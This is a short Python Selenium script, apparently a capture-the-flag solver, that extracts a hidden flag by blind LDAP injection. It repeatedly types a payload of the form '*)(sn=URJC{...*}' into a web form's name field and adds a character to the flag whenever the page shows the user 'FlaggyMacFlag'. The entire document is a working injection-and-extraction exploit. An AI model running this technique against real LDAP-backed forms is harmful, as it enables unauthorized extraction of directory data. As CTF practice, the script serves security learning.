import time
import string
from selenium import webdriver
from selenium.common import UnexpectedAlertPresentException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

driver = webdriver.Chrome()

driver.get('https://r3-ctf-vulnerable.numa.host')
time.sleep(2)
flag = []
i = 0
lista = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '_', '-', '.', '{', '}']
while True:
    input = driver.find_element(By.XPATH, '//*[@id="name"]')
    prueba = ''.join(flag)
    input.clear()
    input.send_keys('*)(sn=URJC{'+prueba+lista[i]+'*}')
    boton = driver.find_element(By.XPATH, '/html/body/div/div/form/button')
    boton.click()
    try:
        usuario = driver.find_element(By.XPATH, '/html/body/div/div/div/div').text
        if usuario == "FlaggyMacFlag":
            flag.append(lista[i])
            i = 0
    except Exception as e:
        i += 1
